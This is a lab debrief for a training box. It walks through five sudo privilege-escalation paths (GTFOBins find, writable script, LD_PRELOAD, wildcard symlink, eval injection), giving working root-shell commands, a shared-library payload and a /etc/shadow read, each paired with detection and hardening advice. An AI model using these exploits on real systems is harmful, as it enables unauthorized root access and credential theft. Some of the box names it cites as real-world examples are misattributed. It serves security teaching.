# Chapter 03 — Debrief / Full Writeup

> Spoilers ahead. This is the blue-team-grade debrief: every path to root
> on `hollow-dmz-01`, **why** it works, how a defender **detects** it, and
> how they **fix** it. Work the box from [README.md](README.md) first.

---

## Background: what sudo actually is

**sudo** is a **SUID-root** program that reads a policy file
(`/etc/sudoers` and anything dropped in `/etc/sudoers.d/`) and decides
whether the caller may run a specific command as a specific target user
(default: `root`). If yes, sudo sets its uid/gid to the target user and
`execve`s the command.

Sudo has three big privilege boundaries baked into its design:

1. **The rule itself** — who, run what, as whom, with or without password.
2. **The environment** — by default (`env_reset` on) sudo scrubs almost
   every env var and rebuilds a minimal one. `env_keep` opts specific
   vars back in.
3. **The target command** — sudo trusts that the command's own code is
   safe for root to run. Everything inside that command — its arguments,
   the files it reads, the libraries it loads, the paths it follows —
   is the target user's responsibility, not sudo's.

Every station below breaks one of those boundaries.

**Enumerate what sudo will let you do:**

```bash
sudo -l                           # the authoritative list
cat /etc/sudoers.d/* 2>/dev/null  # drop-in files (often world-readable)
ls -la /opt/admin                 # the sudo'd scripts live here
```

Expected `sudo -l` on this box:

```
User labuser1 may run the following commands on hollow-dmz-01:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /opt/admin/backup.sh
    (ALL) NOPASSWD: /usr/sbin/rtr-health
    (ALL) NOPASSWD: /usr/bin/cat /var/log/app/*.log
    (ALL) NOPASSWD: /opt/admin/add-contact.sh *
Matching Defaults entries for labuser1 on hollow-dmz-01:
    env_keep+="LD_PRELOAD"
```

Five commands, one `env_keep` line, five stations.

---

## Station A — NOPASSWD on `find` (GTFOBins) · ★☆☆☆

### 1. Recon
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find
```
Sudo will run `/usr/bin/find` as root, no password, with any arguments
you supply.

### 2. The flaw
`find` carries `-exec`, which runs an arbitrary command for each match.
When `find` is sudo'd, that arbitrary command runs **as root**. This is
the canonical GTFOBins "Sudo" entry for `find`.

### 3. Exploit
```bash
sudo /usr/bin/find /tmp -maxdepth 0 -exec /bin/bash \;
# root@hollow-dmz-01:/tmp# id
# uid=0(root) gid=0(root) groups=0(root)
# root@hollow-dmz-01:/tmp# cat /root/flag.txt
```

- `/tmp -maxdepth 0` — pick any existing path; we don't actually want
  `find` to search anything.
- `-exec /bin/bash \;` — for the one "match" (the path itself), run
  `/bin/bash` and wait for it (the `\;` terminates the `-exec` clause
  so the shell doesn't try to parse the `;`).
- Root bash lands inside the terminal.

### 4. Why it works
Sudo only checks "is `/usr/bin/find` an allowed command for labuser1?"
It is. It does **not** sandbox what the command does with its arguments.
`find` is a general-purpose Unix tool with a documented "run anything"
option (`-exec`), so granting sudo on `find` granted sudo on *everything*.

GTFOBins catalogues the same pattern for `awk`, `vim`, `less`, `nano`,
`man`, `env`, `sed`, `perl`, `python3`, `tar`, `unzip`, dozens more.
Each is one `sudo -l` away from a root shell.

### 5. Detect
```bash
# Enumerate every sudoers rule and flag GTFOBins binaries:
for b in find awk vim less nano man env sed perl python3 tar unzip ruby; do
    grep -RHnE "NOPASSWD?:\s*(ALL|.*/${b}\s|.*/${b}$)" /etc/sudoers /etc/sudoers.d/ 2>/dev/null
done
```
Any match is a finding. For runtime detection, auditd on `execve` with
`euid=0` and a `comm` from the GTFOBins list — a `find` or `awk` as
root under a user session is almost always wrong.

### 6. Harden
- **Never grant sudo on a general-purpose tool** (`find`, `awk`, `vim`,
  `less`, …). Grant on a specific wrapper that does one thing.
- Prefer file capabilities (`cap_dac_read_search` on a tiny custom tool)
  over SUID or sudo.
- If `find` really must be sudo'd, scope it harshly in the command spec
  AND use a `--` sentinel wrapper that strips `-exec`/`-execdir`/`-fprintf`
  before invoking.

### 7. Real world
The #1 sudo-privesc on CTF boxes and in real audits. HTB *Shrek*, *Nibbles*,
*Lame*, and countless THM rooms end on `sudo find -exec`. LinPEAS flags
every GTFOBins sudo entry automatically.

---

## Station B — NOPASSWD on a world-writable script · ★★☆☆

### 1. Recon
```bash
sudo -l
# (ALL) NOPASSWD: /opt/admin/backup.sh
ls -la /opt/admin/backup.sh
# -rw-rw-rw- 1 root root ... /opt/admin/backup.sh    <-- 0666, world-writable!
cat /opt/admin/backup.sh
# #!/bin/bash
# /usr/bin/tar czf /opt/backups/logs.tgz /var/log 2>/dev/null
```

### 2. The flaw
The **sudoers entry** is locked down (0440 root-owned under
`/etc/sudoers.d/`). The **script it runs** is `0666` — world-writable.
Sudo checks "can labuser1 run `/opt/admin/backup.sh`?" The script is
whatever's in the file at exec time.

### 3. Exploit
```bash
cat > /opt/admin/backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash
EOF
sudo /opt/admin/backup.sh
/tmp/rootbash -p
id; cat /root/flag.txt
```

Or just drop a straight shell:
```bash
echo '/bin/bash' >> /opt/admin/backup.sh
sudo /opt/admin/backup.sh
```

### 4. Why it works
Sudo's policy is "which path is this user allowed to run?" It does not —
and could not — enforce that the file at that path is immutable. Overwriting
the file before `sudo` invokes it is a race-free TOCTOU because you're not
racing sudo, you're just changing the file sudo will then execute.

This is the SUDO equivalent of **Chapter 02's Station A** — the writable
thing is the script; same root cause, different trigger (user-invoked
sudo vs. cron tick).

### 5. Detect
```bash
# Every script a sudoers rule grants must be root-owned and not g/o writable:
awk '/^[a-zA-Z]/ && /NOPASSWD/ {for (i=1; i<=NF; i++) if ($i ~ /^\//) print $i}' \
    /etc/sudoers /etc/sudoers.d/* 2>/dev/null \
  | sort -u \
  | while read p; do
      [ -e "$p" ] && find "$p" -perm /022 -printf '[WRITABLE] %M %u:%g %p\n'
    done
```
auditd: `-w /opt/admin/backup.sh -p wa -k sudo_script_write` catches the plant.

### 6. Harden
```bash
chown root:root /opt/admin/backup.sh
chmod 0755 /opt/admin/backup.sh    # or 0700 if no reader needs it
```
Structural: every script in a sudoers command spec MUST be root-owned and
not group/other writable. Add a CI check. Package the script via your
config-management tool, not by hand.

### 7. Real world
Extremely common in home-grown "backup", "deploy", and "rotate" scripts.
Someone `chmod 777`'d it during an incident at 2am and it stuck. Also
shows up when a non-root service account writes to `/opt/<product>/bin`
and an admin later grants sudo on a script there.

---

## Station C — `env_keep += "LD_PRELOAD"` · ★★☆☆

### 1. Recon
```bash
sudo -l
# Defaults env_keep += "LD_PRELOAD"
# (ALL) NOPASSWD: /usr/sbin/rtr-health
file /usr/sbin/rtr-health
# /usr/sbin/rtr-health: ELF 64-bit LSB pie executable, dynamically linked ...
ls -la /usr/sbin/rtr-health
# -rwxr-xr-x 1 root root ...                 <-- NOT SUID, just root-owned
```

### 2. The flaw
By default sudo wipes almost every env var before invoking the target
command (`env_reset`). `env_keep +=` adds specific vars back. `LD_PRELOAD`
on that list defeats the whole point of `env_reset`: the dynamic linker
will load **any `.so`** you point it at before `main()` runs, inheriting
the target user's privileges.

Critically, this only works when the sudo'd binary is **not** SUID. A
SUID binary triggers the kernel's `AT_SECURE=1` flag, and the dynamic
linker then ignores `LD_PRELOAD`. `rtr-health` is a plain root-owned
0755 binary, so when sudo transitions to root and `execve`s it,
`AT_SECURE=0` and `LD_PRELOAD` is honored.

### 3. Exploit
```bash
cat > /tmp/pwn.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void pwn(void) {
    unsetenv("LD_PRELOAD");   // <-- CRITICAL. See below.
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC /tmp/pwn.c -o /tmp/pwn.so
sudo LD_PRELOAD=/tmp/pwn.so /usr/sbin/rtr-health
# root@hollow-dmz-01:/# id
# uid=0(root) gid=0(root)
# root@hollow-dmz-01:/# cat /root/flag.txt
```

- `__attribute__((constructor))` — this function runs when the shared
  object is loaded, **before** `main()` of `rtr-health` is called.
- `-shared -fPIC` — build the file as a shared library (`.so`) with
  position-independent code (required for shared objects).
- `unsetenv("LD_PRELOAD")` — **mandatory**. Without this, `system()`
  forks a shell that inherits `LD_PRELOAD` from the parent, which loads
  `pwn.so` again, whose constructor calls `system()` again — exponential
  fork-bomb until the kernel's OOM killer tears the process tree down
  (you'll see a SIGKILL / "Killed" message). Unsetting the env var once
  is enough; every child inherits the cleaned environment from this point.
- `setuid(0)` + `/bin/bash -p` — nail the real UID to 0 and spawn a
  privileged shell (see Chapter 02 Station A for the full `-p` deep-dive).

### 4. Why it works
`sudo` honors `env_keep`. When it builds the target environment, it
forwards `LD_PRELOAD=/tmp/pwn.so`. It then `execve`s `/usr/sbin/rtr-health`
as root. The loader (`ld.so`) sees `AT_SECURE=0` (non-SUID binary),
reads `LD_PRELOAD` from the env, maps `pwn.so` into the process, and
invokes every constructor function. Your `pwn()` runs as root before
`rtr-health` ever prints its "system OK" line.

### 5. Detect
```bash
# Flag sudoers rules that preserve dangerous env vars:
grep -rE 'env_keep.*\b(LD_PRELOAD|LD_LIBRARY_PATH|LD_AUDIT|PYTHONPATH|PERL5LIB|BASH_ENV|RUBYLIB)\b' \
    /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```
Any match is a critical finding.

### 6. Harden
- **Never** add `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `PYTHONPATH`,
  `PERL5LIB`, `BASH_ENV`, or `RUBYLIB` to `env_keep`. They are code-loading
  channels.
- If a specific env var really must survive sudo, add only that one with a
  `Defaults!cmd env_keep` scoped to the single command (tagged syntax).
- Prefer wrapping the command in a tiny script that sets the env itself
  from a trusted path, instead of trusting the caller's env.

### 7. Real world
The canonical "sudo misconfig" lab: Hack The Box *Jerry*, *Lame*, and a
regular finding in home-grown Ansible playbooks that `env_keep`'d
"all the env vars the dev tool needs" without auditing which ones are
code loaders. Also the mechanism behind the famous `gdb` sudo escape
(`env_keep` HOME + pwning a config in the user's HOME).

---

## Station D — sudoers wildcard + symlink · ★★★☆

### 1. Recon
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/cat /var/log/app/*.log
ls -ld /var/log/app
# drwxrwxrwx ... /var/log/app                <-- 0777, you can write!
```

### 2. The flaw
The sudoers entry uses `fnmatch`-style globs, so `*.log` matches any
filename ending in `.log` inside `/var/log/app/`. A filename, in Unix,
can be a **symbolic link**. `cat` follows symbolic links by default.
Put a symlink in the dir that points at the flag, and `sudo cat` reads
the target.

### 3. Exploit
```bash
ln -s /root/flag.txt /var/log/app/pwn.log
sudo /usr/bin/cat /var/log/app/pwn.log
# R2R{sud0_rules_rules_everything_around_me}
```

Two moves. The win is a one-shot read of the flag; chain further if you
need code exec:

```bash
# Chain: symlink /etc/shadow, sudo cat it, crack the hashes with john.
ln -sf /etc/shadow /var/log/app/sh.log
sudo /usr/bin/cat /var/log/app/sh.log > /tmp/shadow
```

### 4. Why it works
Three decisions by three different components stack:

1. **Sudo's match** uses `fnmatch` on the *as-written* path. `*.log`
   matches `pwn.log`; the match doesn't care that the inode is a symlink.
2. **`/var/log/app`** is `0777`, so you can create any entry (symlink
   included) there.
3. **`cat`** calls `open(..., O_RDONLY)` which the kernel resolves through
   symbolic links by default. `cat` just reads whatever the FD points to.

Combined, it's a **read-anywhere primitive** as root. Any file root can
read, you can read.

### 5. Detect
```bash
# Flag wildcards in sudoers commands:
grep -rE 'NOPASSWD?.*\*' /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# Cross-reference with world-writable dirs in the sudoers paths:
for p in $(grep -rohE '/[^[:space:]]+/\*' /etc/sudoers /etc/sudoers.d/ 2>/dev/null | sed 's|/\*$||' | sort -u); do
    [ -d "$p" ] && find "$p" -maxdepth 0 -perm -0002 -printf '[WORLDWRITE] %M %u:%g %p\n'
done
```
auditd: `-w /var/log/app -p wa` catches symlink creation.

### 6. Harden
- Don't use wildcards in sudoers command specs unless the wildcard
  directory is **root-owned and non-writable** (0755 or stricter).
- Replace `cat` with a parser that refuses to traverse symbolic links
  (`cat -- "$(realpath --no-symlinks "$FILE")"` won't quite do it; the
  right fix is to use `openat()` with `O_NOFOLLOW` in a tiny wrapper).
- Prefer **structured log APIs** (journald + the `adm` group) over giving
  sudo on `cat`.

### 7. Real world
The sudoers-wildcard-plus-symlink class is the bread and butter of the
real-world "privesc via log reader" finding. Also appears as `sudo chmod`
or `sudo chown` with a wildcard — in those cases the symlink gets
`chmod`/`chown`'d *through* to the target file.

---

## Station E — eval injection in a sudo'd script · ★★★☆

### 1. Recon
```bash
sudo -l
# (ALL) NOPASSWD: /opt/admin/add-contact.sh *
cat /opt/admin/add-contact.sh
# #!/bin/bash
# NAME=$1
# eval "echo Added: $NAME"
# echo "$NAME" >> /opt/admin/contacts.txt 2>/dev/null
```

### 2. The flaw
The sudoers spec has a `*` after the command, meaning **any argv** the user
supplies is forwarded. The script takes `$1` and passes it into `eval`.
`eval "echo Added: $NAME"` reparses the final string through the shell —
shell metacharacters in your argument escape the intended command.

### 3. Exploit
Interactive:
```bash
sudo /opt/admin/add-contact.sh 'bob; /bin/bash'
# Added: bob
# root@hollow-dmz-01:/home/labuser1#
```

What eval sees: `echo Added: bob; /bin/bash`. Shell runs two commands:
`echo Added: bob` and then `/bin/bash` — a root shell.

Non-interactive (what the self-test uses):
```bash
sudo /opt/admin/add-contact.sh 'x; cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag'
cat /tmp/flag
# R2R{sud0_rules_rules_everything_around_me}
```

### 4. Why it works
Three layers compound:

1. **Sudo passes argv through.** `*` in the sudoers command spec means
   "any arguments". Sudo makes no attempt to sanitize them.
2. **The script assigns and re-expands.** `NAME=$1; eval "echo $NAME"` is a
   double-parse: the first expansion inlines your argv text, the second
   evaluates the resulting string as a new shell command line.
3. **Eval runs as root.** sudo already switched uid to 0 before executing
   the script. The second-parse commands inherit that.

Same root cause as **Chapter 01 Station D** (command injection in a SUID
binary): untrusted argv flows into a shell. Different trigger, same bug.

### 5. Detect
```bash
# Grep every sudo'd script for shell-injection patterns:
awk '/NOPASSWD/ {for (i=1; i<=NF; i++) if ($i ~ /^\//) print $i}' \
    /etc/sudoers /etc/sudoers.d/* 2>/dev/null \
  | sort -u \
  | xargs -r grep -HnE '\beval\b|\bsh[[:space:]]+-c\b|`.*\$' 2>/dev/null
```
Any hit needs a review.

### 6. Harden
- **Never** use `eval` or `sh -c` on user-supplied input in a privileged
  script. Not with careful quoting, not with "escaping". Just don't.
- If you must pass a value to another command, use an array and
  positional parameters:
  ```bash
  /usr/bin/logger -- "added: $1"          # safe: argv, not shell
  printf '%s\n' "$1" >> /opt/admin/contacts.txt
  ```
- Validate `$1` against a tight allowlist (`[[ $1 =~ ^[A-Za-z0-9._ -]+$ ]]`).
- Narrow the sudoers spec: drop the `*`, require an exact argument, or
  strip the trailing `*` entirely so sudo rejects unusual inputs.

### 7. Real world
The sudoers'd shell-wrapper is a gold-mine of injection bugs. Real
engagements regularly find `bash -c "command $USER_INPUT"`,
`eval $COMMAND`, backticks, and command substitution inside otherwise
"locked-down" admin scripts — all behind a `NOPASSWD` sudo rule.
CVE-landscape equivalents: CVE-2021-3156 (sudo "Baron Samedit", heap
overflow in `sudo` itself), and many vendor-specific sudo wrapper CVEs.

---

## Scoreboard

| Station | Mistake | Primitive | Difficulty |
|---------|---------|-----------|:----------:|
| A | NOPASSWD on a GTFOBins-known binary | `-exec`/`:!shell` escape | ★☆☆☆ |
| B | NOPASSWD on a world-writable script | overwrite then invoke | ★★☆☆ |
| C | `env_keep += "LD_PRELOAD"` | `.so` constructor runs as root | ★★☆☆ |
| D | sudoers wildcard + user-writable dir | symlink → sudo'd read | ★★★☆ |
| E | sudo'd script `eval`s argv | shell injection via argv | ★★★☆ |

**The through-line:** every grant of sudo is an implicit grant of everything
that command (or its arguments, or its environment, or the files it touches)
can reach. Secure sudo configurations grant the minimum privilege needed,
on narrow custom wrappers that do one thing, with env_reset intact and
no wildcards over user-writable dirs. Every rule you write should be
auditable in one line: *who, runs what, with what args, as whom.*

---

## Clean up / reset

```bash
# from the repo root on your host
docker compose up -d --build --force-recreate target-sudo
```

Rebuilds the box back to pristine-vulnerable (fresh flag, all five
stations armed).
